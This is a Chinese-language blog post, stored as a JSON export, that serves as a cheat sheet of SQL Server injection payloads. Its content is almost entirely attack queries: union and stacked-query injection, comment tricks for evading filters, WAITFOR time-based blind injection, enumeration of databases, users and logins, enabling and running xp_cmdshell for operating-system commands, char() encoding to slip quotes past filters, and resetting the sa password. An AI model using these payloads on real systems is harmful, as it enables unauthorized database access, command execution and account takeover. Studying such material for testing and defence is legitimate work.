{"title":"SQLServer","slug":"SQLServer","date":"2020-02-22T12:39:59.345Z","updated":"2020-02-22T12:40:53.447Z","comments":true,"path":"api/articles/SQLServer.json","photos":[],"link":"","excerpt":"SQL Server注入基本特性查看版本:​    @@version1<br>2<br>select * from test.dbo.users where id &#x3D; 1 and(1&#x3D;1);select @@version;<br>select * from test..users union select 6,@@version,&#39;aa&#39;<br>注释符:","covers":null,"content":"<h2 id=\"SQL-Server注入\"><a href=\"#SQL-Server注入\" class=\"headerlink\" title=\"SQL Server注入\"></a>SQL Server注入</h2><h3 id=\"基本特性\"><a href=\"#基本特性\" class=\"headerlink\" title=\"基本特性\"></a>基本特性</h3><h4 id=\"查看版本\"><a href=\"#查看版本\" class=\"headerlink\" title=\"查看版本:\"></a><strong>查看版本:</strong></h4><p>​    @@version</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from test.dbo.users where id &#x3D; 1 and(1&#x3D;1);select @@version;</span><br><span class=\"line\">select * from test..users union select 6,@@version,&#39;aa&#39;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注释符\"><a href=\"#注释符\" class=\"headerlink\" title=\"注释符:\"></a><strong>注释符:</strong><a id=\"more\"></a></h4><p>​    –   /**/</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from test..users where id&#x3D;1 and 1&#x3D;1--comment</span><br><span class=\"line\">select * from test.dbo.users where id &#x3D; 1and(1&#x3D;(select 1))--comment</span><br><span class=\"line\">select * from test.dbo.users where id &#x3D;(select(1))and(1&#x3D;(select&#x2F;**&#x2F;1));</span><br><span class=\"line\">select * from test..users where id&#x3D;1 and&#x2F;*comment*&#x2F;1&#x3D;1</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"时间延迟：\"><a href=\"#时间延迟：\" class=\"headerlink\" title=\"时间延迟：\"></a><strong>时间延迟：</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from test..users where id&#x3D;1 WAITFOR DELAY &#39;0:0:3&#39;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"当前数据库\"><a href=\"#当前数据库\" class=\"headerlink\" title=\"当前数据库:\"></a><strong>当前数据库:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select DB_NAME()</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"列出数据库\"><a href=\"#列出数据库\" class=\"headerlink\" title=\"列出数据库:\"></a><strong>列出数据库:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select name FROM master..sysdatabases</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"当前用户\"><a href=\"#当前用户\" class=\"headerlink\" title=\"当前用户:\"></a><strong>当前用户:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select user_name()</span><br><span class=\"line\">select system_user</span><br><span class=\"line\">select user</span><br><span class=\"line\">select loginame FROM master..sysprocesses WHERE spid &#x3D; @@SPID</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"用户\"><a href=\"#用户\" class=\"headerlink\" title=\"用户:\"></a><strong>用户:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select name FROM master..syslogins</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"执行命令\"><a href=\"#执行命令\" class=\"headerlink\" title=\"执行命令:\"></a><strong>执行命令:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EXEC xp_cmdshell &#39;net user&#39;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"开启和关闭xp-cmdshell\"><a href=\"#开启和关闭xp-cmdshell\" class=\"headerlink\" title=\"开启和关闭xp_cmdshell:\"></a><strong>开启和关闭xp_cmdshell:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EXEC sp_configure &#39;show advanced options&#39;,1;</span><br><span class=\"line\">go</span><br><span class=\"line\">reconfigure;</span><br><span class=\"line\">go</span><br><span class=\"line\">sp_configure &#39;xp_cmdshell&#39;,1; --0关闭</span><br><span class=\"line\">go</span><br><span class=\"line\">reconfigure;</span><br><span class=\"line\">go</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ASCII\"><a href=\"#ASCII\" class=\"headerlink\" title=\"ASCII:\"></a><strong>ASCII:</strong></h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select char(0x27) -- &#39;</span><br><span class=\"line\">select ascii(&#39;&#39;&#39;&#39;) -- 十进制39 &#39;&#39; 表示&#39;</span><br><span class=\"line\">select char(65)+char(66)+char(39) -- AB&#39;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"更改用户密码：\"><a href=\"#更改用户密码：\" class=\"headerlink\" title=\"更改用户密码：\"></a><strong>更改用户密码</strong>：</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALTER LOGIN [sa] WITH PASSWORD&#x3D;N&#39;NewPassword&#39;</span><br></pre></td></tr></table></figure>","categories":[],"tags":[]}